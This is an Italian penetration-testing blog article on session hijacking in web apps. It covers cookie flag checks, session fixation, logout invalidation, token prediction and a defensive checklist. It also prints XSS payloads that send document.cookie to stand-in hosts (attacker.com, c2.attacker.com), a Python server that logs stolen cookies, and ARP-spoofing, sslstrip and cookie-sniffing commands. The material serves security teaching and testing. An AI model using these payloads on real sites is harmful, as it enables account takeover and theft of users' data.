---
title: 'Session Hijacking: Furto Cookie, XSS e Session Fixation nelle Web App'
slug: session-hijacking
description: >-
  Session Hijacking nel pentesting web: furto cookie via XSS, session fixation,
  sniffing HTTP e takeover account. Analisi flag HttpOnly, Secure e SameSite.
image: /session-hijacking.webp
draft: false
date: 2026-03-19T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - session-hijacking
  - session-management
featured: true
---

Il session cookie è la chiave della porta: dopo il login, il server genera un token di sessione, lo invia al browser come cookie, e da quel momento **ogni request con quel cookie è autenticata** come quell'utente. Non servono più username e password — il cookie è la prova di identità. Se l'attaccante ottiene il cookie, **diventa la vittima**: accede al suo account, ai suoi dati, alle sue funzionalità. Senza conoscere la password, senza triggerare alert di login sospetto.

È un attacco che incontro con una frequenza sorprendente. Non perché il furto di sessione sia difficile da prevenire — i flag `HttpOnly`, `Secure`, `SameSite` esistono da anni — ma perché **gli sviluppatori dimenticano di metterli**. O li mettono ma lasciano una [XSS](https://hackita.it/articoli/xss) che rende `HttpOnly` irrilevante. O configurano HTTPS ma dimenticano il flag `Secure` e il cookie viaggia in chiaro sulla prima request HTTP.

Satellite della [guida pillar Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa). Vedi anche: [JWT Attack](https://hackita.it/articoli/jwt-attack), [CSRF](https://hackita.it/articoli/csrf).

Riferimenti: [PortSwigger Session Management](https://portswigger.net/web-security/authentication/other-mechanisms), [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).

***

## Cookie Flag Analysis — Il Primo Test (30 Secondi)

Prima di cercare vulnerabilità complesse, controlla i flag del cookie. Se mancano, il gioco è già mezzo fatto:

```bash
# Intercetta il Set-Cookie nella response di login:
curl -v "https://target.com/login" \
  -X POST -d "username=test&password=test" 2>&1 | grep -i "set-cookie"

# Output da analizzare:
Set-Cookie: session=abc123xyz; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600

# === FLAG CHECK ===
# HttpOnly → il cookie NON è accessibile da JavaScript
#   MANCANTE? → rubabile via XSS con document.cookie
#
# Secure → il cookie è inviato SOLO su HTTPS
#   MANCANTE? → intercettabile su HTTP (rete pubblica, downgrade)
#
# SameSite=Strict|Lax → il cookie NON è inviato in request cross-site
#   MANCANTE? → attaccabile via CSRF e cross-site request
#   SameSite=None → inviato ovunque (vulnerabile!)
#
# Max-Age/Expires → la sessione scade
#   TROPPO LUNGO (>24h)? → finestra di attacco ampia
#   ASSENTE? → session cookie (muore alla chiusura del browser — OK)
```

### Script di Analisi Automatica

```bash
#!/bin/bash
# cookie_check.sh — Analizza i flag di sicurezza dei cookie
URL="https://target.com"

echo "[*] Checking cookies for $URL"
cookies=$(curl -s -I "$URL" | grep -i "set-cookie")

echo "$cookies" | while read -r line; do
  echo ""
  echo "[Cookie] $line"
  echo "$line" | grep -qi "httponly"  && echo "  ✅ HttpOnly" || echo "  ❌ HttpOnly MANCANTE"
  echo "$line" | grep -qi "secure"   && echo "  ✅ Secure"   || echo "  ❌ Secure MANCANTE"
  echo "$line" | grep -qi "samesite" && echo "  ✅ SameSite"  || echo "  ❌ SameSite MANCANTE"
done
```

***

## Vettore 1 — Furto Cookie Via XSS

Se il flag `HttpOnly` manca, una [XSS](https://hackita.it/articoli/xss) permette di rubare il cookie con `document.cookie`:

```javascript
// XSS stored o reflected che esfiltra il cookie:
<script>
new Image().src = "https://attacker.com/steal?c=" + document.cookie;
</script>

// Varianti per bypassare filtri:
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

<svg/onload="navigator.sendBeacon('https://attacker.com/steal',document.cookie)">

// Se document.cookie è vuoto (HttpOnly attivo):
// Il cookie non è accessibile da JS → questo vettore NON funziona
// Ma la XSS è comunque sfruttabile per altre cose (keylogger, phishing)
```

### Intercettazione Sul Server Attaccante

```python
# steal_server.py — cattura cookie in arrivo
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        if 'c' in params:
            print(f"\n[+] COOKIE CAPTURED: {params['c'][0]}")
            with open("stolen_cookies.txt", "a") as f:
                f.write(f"{self.client_address[0]} | {params['c'][0]}\n")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```

### Uso Del Cookie Rubato

```bash
# Sul tuo browser:
# DevTools → Application → Cookies → aggiungi manualmente il cookie rubato

# O con curl:
curl -s -H "Cookie: session=STOLEN_COOKIE_VALUE" \
  "https://target.com/api/me"
# → Sei la vittima!
```

***

## Vettore 2 — Network Sniffing (HTTP Senza Secure)

Se il flag `Secure` manca, il cookie viene inviato anche su **connessioni HTTP non cifrate**. Su una rete condivisa (Wi-Fi pubblico, rete aziendale), un attaccante può intercettare il cookie:

```bash
# Con Wireshark sulla rete locale:
# Filtro: http.cookie contains "session"
# → Ogni request HTTP dell'utente contiene il cookie in chiaro

# Con tcpdump:
sudo tcpdump -i wlan0 -A 'port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' \
  | grep -i "cookie:"

# Con mitmproxy (ARP spoofing + intercettazione):
# Step 1: ARP spoof per intercettare il traffico della vittima
arpspoof -i wlan0 -t VICTIM_IP GATEWAY_IP
# Step 2: mitmproxy intercetta le request HTTP
mitmproxy -p 8080
# Step 3: cerca il cookie nelle request intercettate
```

### HSTS Bypass (quando il sito ha HTTPS ma non HSTS)

```bash
# Se il sito ha HTTPS ma NON ha l'header Strict-Transport-Security:
# La prima request potrebbe essere HTTP (prima del redirect a HTTPS)
# In quella prima request → il cookie viaggia in chiaro!

# SSLstrip: forza il browser a usare HTTP
# (funziona solo se HSTS non è configurato E il cookie non ha flag Secure)
sslstrip -l 8080
```

***

## Vettore 3 — Session Fixation

L'attaccante **imposta un session ID noto** nel browser della vittima **prima** che faccia login. Dopo il login, il session ID resta lo stesso → l'attaccante lo conosce:

```bash
# Step 1: l'attaccante ottiene un session ID valido (non autenticato)
curl -v "https://target.com" 2>&1 | grep "Set-Cookie"
# Set-Cookie: session=KNOWN_SESSION_ID

# Step 2: forza la vittima ad usare quel session ID
# Via link: https://target.com/?session=KNOWN_SESSION_ID
# Via XSS: document.cookie = "session=KNOWN_SESSION_ID"
# Via meta tag se controllabile: <meta http-equiv="Set-Cookie" content="session=KNOWN_SESSION_ID">

# Step 3: la vittima fa login → il server autentica KNOWN_SESSION_ID
# Step 4: l'attaccante usa KNOWN_SESSION_ID → è autenticato come la vittima!
```

### Test

```bash
# Il server rigenera il session ID dopo il login?
# Step 1: nota il session ID PRIMA del login
# Step 2: fai login
# Step 3: confronta il session ID DOPO il login

# Se è lo STESSO → Session Fixation possibile!
# Se è DIVERSO → il server rigenera correttamente → protetto
```

***

## Vettore 4 — Session Non Invalidata Dopo Logout

```bash
# Step 1: fai login → nota il session cookie
# Step 2: copia il cookie
# Step 3: fai logout
# Step 4: usa il cookie copiato

curl -s -H "Cookie: session=COOKIE_PRIMA_DEL_LOGOUT" \
  "https://target.com/api/me"

# Se risponde con i tuoi dati → la sessione NON è stata invalidata!
# → Il cookie funziona anche dopo il logout
# → Un cookie rubato funziona per sempre (o fino alla scadenza)
```

***

## Vettore 5 — Session Token Prediction

Se il session ID è prevedibile (sequenziale, basato su timestamp, basato su dati noti), l'attaccante può **predire** i session ID di altri utenti:

```bash
# Raccogli diversi session ID:
session1: abc123000001
session2: abc123000002
session3: abc123000003
# → Pattern sequenziale! Prova abc123000004, abc123000005...

# O basato su timestamp:
session: 1708300000_user1337
# → Per un altro utente: 1708300001_user1338?

# Tool: Burp Sequencer
# Raccogli 10.000 session token → Burp analizza l'entropia
# Se l'entropia è bassa → il token è prevedibile → attaccabile
```

***

## Output Reale — Da Cookie A Takeover

### XSS Cookie Theft

```bash
# XSS stored nel campo "commento" di un blog:
POST /api/comments
{"body": "<script>new Image().src='https://attacker.com:8080/steal?c='+document.cookie</script>"}

# Sul server attaccante:
$ python3 steal_server.py
[+] COOKIE CAPTURED: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0MiwiZXhwIjoxNzA4MzAwMDAwfQ.abc123

# Uso il cookie:
$ curl -s -H "Cookie: session=eyJ0eXAiOiJ..." "https://target.com/api/me"
{"id": 42, "name": "Mario Verdi", "email": "mario@company.com", "role": "admin"}
# → Sono Mario Verdi, admin!
```

### Session Non Invalidata

```bash
# Prima del logout:
$ curl -s -H "Cookie: session=abc123" "https://target.com/api/me"
{"id": 1337, "name": "Test User"}

# Logout:
$ curl -s -X POST "https://target.com/api/logout" -H "Cookie: session=abc123"
{"status": "logged_out"}

# Dopo il logout — lo STESSO cookie funziona ancora:
$ curl -s -H "Cookie: session=abc123" "https://target.com/api/me"
{"id": 1337, "name": "Test User"}
# → La sessione non è stata invalidata server-side!
```

***

## Workflow Reale — Session Security Audit

### Step 1 → Analizza i flag del cookie

```bash
curl -v "https://target.com/login" -d "user=test&pass=test" 2>&1 | grep -i "set-cookie"
# Verifica: HttpOnly, Secure, SameSite, Max-Age
```

### Step 2 → Se HttpOnly manca → testa cookie theft via XSS

```bash
# Cerca una XSS (reflected o stored) → inietta document.cookie exfiltration
# Se trovi → account takeover di qualsiasi utente che visita la pagina
```

### Step 3 → Testa session fixation

```bash
# Nota session ID prima del login → fai login → confronta
# Se uguale → session fixation possibile
```

### Step 4 → Testa invalidazione post-logout

```bash
# Copia cookie → logout → usa cookie copiato
# Se funziona ancora → sessione non invalidata
```

### Step 5 → Burp Sequencer per entropia del token

```bash
# Raccogli 10.000 token → analizza con Sequencer
# Entropia < 64 bit → token prevedibile
```

### Step 6 → Testa timeout della sessione

```bash
# Autenticati → aspetta X ore → la sessione scade?
# Se funziona dopo 24h/1 settimana → finestra di attacco troppo ampia
```

***

## Enterprise Escalation

### XSS + No HttpOnly → Mass Account Takeover

```
XSS stored nel forum aziendale → ogni dipendente che visita perde il cookie
→ 500 cookie rubati in 24 ore
→ 500 account compromessi (inclusi admin, HR, finance)
→ MASS ACCOUNT TAKEOVER
```

### Session Non Invalidata → Persistent Access

```
Cookie rubato via network sniffing su Wi-Fi aziendale
→ Logout della vittima NON invalida la sessione server-side
→ L'attaccante mantiene l'accesso per settimane
→ Esfiltrazione dati continua → DATA BREACH PROLUNGATO
```

***

## Caso Studio Concreto

**Settore:** Intranet aziendale, 2.000 dipendenti, applicazione HR.
**Scope:** Grey-box.

Il cookie di sessione `HRSESSION` aveva `Secure` e `SameSite=Lax` ma **mancava `HttpOnly`**. Ho trovato una XSS stored nel campo "note personali" del profilo dipendente. Payload: `<script>new Image().src='https://c2.attacker.com/s?c='+document.cookie</script>`. Ho modificato le mie note → ogni volta che un admin visitava il mio profilo per la review trimestrale, il suo cookie veniva catturato.

In 3 giorni: 4 cookie di HR admin catturati. Con un cookie admin: accesso completo a stipendi, valutazioni, documenti di 2.000 dipendenti. La sessione aveva `Max-Age` di 7 giorni e **non veniva invalidata server-side al logout** → accesso persistente per una settimana anche dopo che l'admin aveva fatto logout.

**Tempo:** 5 minuti per setup XSS, 3 giorni di attesa, accesso persistente per 7 giorni.

***

## Errori Comuni

**"Tanto usiamo HTTPS"** — HTTPS cifra il trasporto, ma se il cookie non ha `HttpOnly`, una XSS lo ruba comunque. HTTPS senza `HttpOnly` è un cancello blindato con la finestra aperta.

**"Il logout distrugge il cookie nel browser"** — Sì, ma lo distrugge **solo nel browser**. Se la sessione non è invalidata **server-side**, un cookie copiato funziona ancora.

**"Il token è lungo e random"** — Bene, non è prevedibile. Ma se non scade mai e non è invalidabile, un token rubato garantisce accesso permanente.

***

## ✅ Checklist Session Hijacking

```
FLAG COOKIE
☐ HttpOnly presente?
☐ Secure presente?
☐ SameSite presente? (Strict o Lax)
☐ Max-Age/Expires ragionevole? (<24h)

FURTO COOKIE
☐ Se HttpOnly mancante → XSS per document.cookie testata
☐ Se Secure mancante → sniffing su HTTP testato
☐ Cookie leak in URL (session ID nel query string)?

SESSION FIXATION
☐ Session ID cambia dopo login? (rigenera?)
☐ Session ID accettato da URL/parametro?

INVALIDAZIONE
☐ Cookie funziona dopo logout? (server-side invalidation)
☐ Sessione scade dopo timeout? (idle timeout)
☐ Sessione scade dopo periodo assoluto?

PREDICTION
☐ Burp Sequencer eseguito (entropia > 64 bit?)
☐ Pattern nel session ID? (sequenziale, timestamp)
☐ Almeno 128 bit di entropia nel token?

ESCALATION
☐ Cookie admin rubabile via XSS? (se HttpOnly manca)
☐ Sessione non invalidata → accesso persistente documentato
☐ Multi-session: un utente può avere più sessioni attive?
```

***

Riferimenti: [PortSwigger Session Management vulnerabilities](https://portswigger.net/web-security/authentication/other-mechanisms), [OWASP Session Management Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/), [HackTricks Cookies](https://book.hacktricks.wiki/en/pentesting-web/hacking-with-cookies/index.html).

Satellite della [Guida Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa). Vedi anche: [JWT Attack](https://hackita.it/articoli/jwt-attack), [CSRF](https://hackita.it/articoli/csrf), [XSS](https://hackita.it/articoli/xss).

> Il tuo cookie ha `HttpOnly`? La sessione è invalidata al logout? Il token ha entropia sufficiente? [Penetration test HackIta](https://hackita.it/servizi) per ogni falla nella gestione sessioni. Dal cookie al takeover: [formazione 1:1](https://hackita.it/formazione).
